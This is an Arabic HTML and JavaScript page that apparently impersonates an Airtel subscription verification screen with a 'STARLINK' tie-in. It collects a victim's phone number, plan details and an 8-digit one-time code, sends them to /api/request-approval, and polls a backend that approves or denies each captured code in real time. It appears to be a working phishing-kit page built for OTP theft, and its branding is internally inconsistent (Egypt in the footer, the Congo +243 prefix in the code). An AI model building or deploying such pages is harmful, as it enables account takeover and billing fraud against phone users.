<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
<title>إيرتل لايت — التحقق من رمز التأكيد</title>
<style>
  :root{
    --airtel-red:#e30613;
    --text-dark:#2a2a2a;
    --text-grey:#8a8a8a;
    --border-grey:#d5d5d5;
    --footer-bg:#f4f4f4;
  }
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
  html{-webkit-text-size-adjust:100%;}
  body{
    font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background:#fff;
    color:var(--text-dark);
    min-height:100svh;
    width:100%;
    display:flex;
    flex-direction:column;
    padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
  }
  header{
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:16px 18px;
    border-bottom:1px solid #eee;
  }
  .back{
    width:38px;height:38px;
    border:none;
    background:none;
    font-size:20px;
    color:var(--text-dark);
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-shrink:0;
  }
  .menu-btn{
    width:38px;height:38px;
    border:none;
    background:none;
    cursor:pointer;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    gap:4px;
    flex-shrink:0;
  }
  .menu-btn span{
    display:block;
    width:20px;
    height:2.5px;
    background:var(--text-dark);
    border-radius:2px;
  }

  main{
    flex:1;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding:36px 18px 40px;
  }

  .otp-card{
    width:100%;
    max-width:420px;
    background:#fff;
    border:1px solid #ececec;
    border-radius:16px;
    box-shadow:0 10px 30px rgba(0,0,0,0.06);
    padding:30px 24px 28px;
  }

  .otp-decoration{
    height:132px;
    margin:-30px -24px 22px;
    display:flex;
    align-items:center;
    justify-content:center;
    background:repeating-radial-gradient(circle at center, transparent 0 8px, rgba(227,6,19,0.14) 9px 10px, transparent 11px 16px);
  }
  .otp-decoration svg{
    width:88px;
    height:88px;
    overflow:visible;
  }

  .otp-card h1{
    font-size:clamp(21px, 6.5vw, 26px);
    font-weight:800;
    color:var(--text-dark);
    margin-bottom:16px;
  }

  .otp-card p.sub{
    font-size:14.5px;
    color:var(--text-grey);
    line-height:1.5;
  }
  .otp-card p.sub .phone-num{
    display:block;
    color:var(--text-dark);
    font-weight:700;
    margin-top:2px;
  }

  .otp-code{
    display:grid;
    grid-template-columns:repeat(8, minmax(0, 1fr));
    gap:6px;
    margin-top:12px;
    direction:ltr;
  }
  .otp-digit{
    width:100%;
    min-width:0;
    aspect-ratio:1;
    border:1.5px solid var(--border-grey);
    border-radius:8px;
    text-align:center;
    font-size:18px;
    color:var(--text-dark);
    outline:none;
  }
  .otp-digit:focus{border-color:var(--airtel-red);}

  .helper-text{
    text-align:center;
    font-size:13px;
    color:var(--text-grey);
    margin-top:14px;
  }
  .timer-text{
    text-align:center;
    font-size:13px;
    color:var(--text-grey);
    margin-top:6px;
  }
  .timer-text b{color:var(--text-dark);}

  .submit-btn{
    width:100%;
    min-height:52px;
    border-radius:26px;
    border:none;
    background:#d9d9d9;
    color:#fff;
    font-size:14px;
    font-weight:700;
    letter-spacing:0.6px;
    cursor:not-allowed;
    margin-top:24px;
    touch-action:manipulation;
    transition:background .2s ease;
  }
  .submit-btn.active{
    background:var(--airtel-red);
    cursor:pointer;
    box-shadow:0 8px 18px rgba(227,6,19,0.3);
  }
  .submit-btn.active:active{transform:translateY(1px) scale(0.99);}

  /* --- Waiting-for-approval overlay --- */
  .approval-overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.32);
    backdrop-filter:blur(2px);
    -webkit-backdrop-filter:blur(2px);
    display:none;
    align-items:center;
    justify-content:center;
    padding:24px;
    text-align:center;
    z-index:50;
  }
  .approval-overlay.visible{display:flex;}
  .approval-card{
    width:min(540px, 100%);
    background:#fff;
    border-radius:22px;
    padding:30px 28px 24px;
    box-shadow:0 18px 44px rgba(0,0,0,0.18);
    text-align:center;
  }
  .spinner{
    width:52px;
    height:52px;
    border:4px solid #eee;
    border-top-color:var(--airtel-red);
    border-radius:50%;
    animation:spin 0.9s linear infinite;
    margin:0 auto 18px;
  }
  @keyframes spin{
    to{transform:rotate(360deg);}
  }
  .approval-overlay h2{
    font-size:clamp(23px,4vw,36px);
    font-weight:800;
    color:var(--airtel-red);
    margin-bottom:10px;
  }
  .approval-overlay p{
    font-size:clamp(16px,2.6vw,22px);
    color:#2a2a2a;
    max-width:300px;
    line-height:1.45;
    margin:0 auto;
  }
  .approval-overlay .error-icon{
    display:none;
  }

  .approval-overlay.error-state{
    gap:0;
  }

  .approval-overlay.error-state .error-icon{
    display:none;
  }

  .approval-overlay .denied-msg{
    display:none;
    color:var(--airtel-red);
    font-weight:700;
    font-size:clamp(18px,3vw,26px);
    margin-top:8px;
    width:100%;
  }
  .approval-overlay .retry-btn{
    display:none;
    margin-top:18px;
    border:none;
    background:var(--airtel-red);
    color:#fff;
    font-weight:800;
    font-size:clamp(18px,3vw,26px);
    letter-spacing:0.4px;
    width:100%;
    min-height:58px;
    border-radius:12px;
    cursor:pointer;
    box-shadow:0 10px 20px rgba(227,6,19,0.22);
    transition:transform .15s ease, box-shadow .15s ease;
  }

  .approval-overlay .retry-btn:hover{
    transform:translateY(-1px);
    box-shadow:0 10px 22px rgba(227,6,19,0.30);
  }

  .approval-overlay .retry-btn:active{
    transform:translateY(1px);
  }

  footer{
    background:var(--footer-bg);
    padding:36px 24px 24px;
    text-align:center;
  }
  footer .collab-text{
    font-size:14px;
    color:var(--text-dark);
    font-weight:600;
  }
  footer .collab-brand{
    font-size:14px;
    color:var(--text-dark);
    font-weight:700;
    margin-top:2px;
  }
  footer hr{
    border:none;
    border-top:1px solid #e0e0e0;
    margin:22px 0 18px;
  }
  footer .copyright{
    font-size:12px;
    color:#9b9b9b;
  }
</style>
</head>
<body>

  <header>
    <button class="back" onclick="window.history.back()" aria-label="رجوع">→</button>
    <button class="menu-btn" aria-label="القائمة"><span></span><span></span><span></span></button>
  </header>

  <main>
    <div class="otp-card">
      <div class="otp-decoration" aria-hidden="true">
        <svg viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M105 16C67 16 37 46 37 84C37 116 61 138 92 138C123 138 139 115 139 87C139 63 123 45 100 40L86 37L87 28C88 23 94 18 105 16Z" transform="translate(-18 -7)" fill="white" stroke="#e30613" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h1>تأكيد رمز التحقق</h1>
      <p class="sub">أدخل رمز التحقق المرسل إلى رقم هاتفك
        <span class="phone-num" id="phoneNum"></span>
      </p>

      <div class="otp-code" role="group" aria-label="رمز التحقق المكون من ٨ أرقام">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ١">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٢">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٣">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٤">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٥">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٦">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٧">
        <input class="otp-digit" type="tel" inputmode="numeric" maxlength="1" aria-label="الرقم ٨">
      </div>
      <input type="hidden" id="otpInput">

      <p class="helper-text">أدخل رمز التحقق المكون من ٨ أرقام</p>
      <p class="timer-text">تنتهي صلاحية الرمز خلال <b id="timer">60</b> ثانية</p>

      <button class="submit-btn" id="submitBtn" disabled>تأكيد</button>
    </div>
  </main>

  <div class="approval-overlay" id="approvalOverlay">
    <div class="approval-card">
      <div class="error-icon" id="errorIcon" aria-hidden="true">!</div>
      <div class="spinner" id="spinner"></div>
      <h2 id="overlayTitle">جارٍ التحقق من الرمز</h2>
      <p id="overlayText">يرجى الانتظار...</p>
      <p class="denied-msg" id="deniedMsg">الرمز غير صحيح.</p>
      <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
    </div>
  </div>

  <footer>
    <div class="collab-text">بالتعاون مع</div>
    <div class="collab-brand">STARLINK™</div>
    <hr>
    <div class="copyright">© 2026 إيرتل مصر. جميع الحقوق محفوظة.</div>
  </footer>

<script>
  const params = new URLSearchParams(window.location.search);
  const phone = params.get('phone');
  if(phone){
    document.getElementById('phoneNum').textContent = phone.replace(/^\+?243/, '');
  } else {
    document.getElementById('phoneNum').hidden = true;
  }

  const otpInput = document.getElementById('otpInput');
  const submitBtn = document.getElementById('submitBtn');
  const otpDigits = [...document.querySelectorAll('.otp-digit')];

  function updateOtpValue(){
    otpInput.value = otpDigits.map(input => input.value).join('');
    if(otpInput.value.length === 8){
      submitBtn.classList.add('active');
      submitBtn.disabled = false;
    } else {
      submitBtn.classList.remove('active');
      submitBtn.disabled = true;
    }
  }

  otpDigits.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/[^0-9]/g, '').slice(-1);
      if(input.value && index < otpDigits.length - 1){
        otpDigits[index + 1].focus();
      }
      updateOtpValue();
    });

    input.addEventListener('keydown', event => {
      if(event.key === 'Backspace' && !input.value && index > 0){
        otpDigits[index - 1].focus();
      }
    });

    input.addEventListener('paste', event => {
      const pasted = event.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 8);
      if(!pasted) return;
      event.preventDefault();
      otpDigits.forEach((digitInput, digitIndex) => {
        digitInput.value = pasted[digitIndex] || '';
      });
      otpDigits[Math.min(pasted.length, otpDigits.length) - 1].focus();
      updateOtpValue();
    });
  });

  let seconds = 60;
  const timerEl = document.getElementById('timer');
  const countdown = setInterval(() => {
    seconds--;
    if(seconds <= 0){
      clearInterval(countdown);
      timerEl.textContent = '0';
    } else {
      timerEl.textContent = seconds;
    }
  }, 1000);

  const overlay = document.getElementById('approvalOverlay');
  const spinner = document.getElementById('spinner');
  const overlayTitle = document.getElementById('overlayTitle');
  const overlayText = document.getElementById('overlayText');
  const deniedMsg = document.getElementById('deniedMsg');
  const retryBtn = document.getElementById('retryBtn');
  let pollTimer = null;

  function showOverlayWaiting(){
    overlay.classList.add('visible');
    overlay.classList.remove('error-state');
    spinner.style.display = 'block';
    overlayTitle.textContent = 'جارٍ التحقق من الرمز';
    overlayTitle.style.display = 'block';
    overlayText.style.display = 'block';
    overlayText.textContent = 'يرجى الانتظار... (١ ث)';
    deniedMsg.style.display = 'none';
    retryBtn.style.display = 'none';

    let waitingSeconds = 1;
    if (window.__otpWaitTimer) clearInterval(window.__otpWaitTimer);
    window.__otpWaitTimer = setInterval(() => {
      waitingSeconds += 1;
      overlayText.textContent = `يرجى الانتظار... (${waitingSeconds} ث)`;
    }, 1000);
  }

  function pollApproval(id){
    if(pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(async () => {
      try {
        const res = await fetch('/api/check-approval/' + id);
        const data = await res.json();

        if(data.status === 'approved'){
          clearInterval(pollTimer);
          window.location.href = 'mwish.html?' + params.toString();
        } else if(data.status === 'denied'){
          clearInterval(pollTimer);
          spinner.style.display = 'none';
          overlayTitle.style.display = 'none';
          overlayText.style.display = 'none';
          deniedMsg.textContent = 'الرمز غير صحيح.';
          deniedMsg.style.display = 'block';
          retryBtn.style.display = 'inline-block';
        } else if(data.status === 'insufficient'){
          clearInterval(pollTimer);
          spinner.style.display = 'none';
          overlayTitle.style.display = 'none';
          overlayText.style.display = 'none';
          overlay.classList.add('error-state');

          deniedMsg.textContent = 'الرصيد غير كافٍ.';
          deniedMsg.style.display = 'block';
          retryBtn.style.display = 'inline-block';
        } else if(data.status === 'demo_error'){
          clearInterval(pollTimer);
          spinner.style.display = 'none';
          overlayTitle.style.display = 'none';
          overlayText.style.display = 'none';
          overlay.classList.add('error-state');

          deniedMsg.textContent = 'رمز PIN غير صحيح.';
          deniedMsg.style.display = 'block';
          retryBtn.style.display = 'inline-block';
        }

        // 'pending' -> keep polling
      } catch (err) {
        // network hiccup — keep trying silently
      }
    }, 2500);
  }

  retryBtn.addEventListener('click', () => {
    if (window.__otpWaitTimer) {
      clearInterval(window.__otpWaitTimer);
      window.__otpWaitTimer = null;
    }

    if (deniedMsg.textContent.trim() === 'رمز PIN غير صحيح.') {
      window.location.href = 'trial.html';
      return;
    }

    overlay.classList.remove('visible');
  });

  submitBtn.addEventListener('click', async () => {
    if(submitBtn.disabled) return;
    showOverlayWaiting();

    try {
      const res = await fetch('/api/request-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          plan: params.get('plan'),
          price: params.get('price'),
          phone: phone,
          otp: otpInput.value,
          step: 'otp'
        })
      });
      const data = await res.json();
      pollApproval(data.id);
    } catch (err) {
      overlayTitle.textContent = 'خطأ في الاتصال';
      overlayText.textContent = 'تعذر إرسال الطلب. تحقق من اتصالك بالإنترنت وحاول مرة أخرى.';
      spinner.style.display = 'none';
      retryBtn.style.display = 'inline-block';
    }
  });
</script>

</body>
</html>
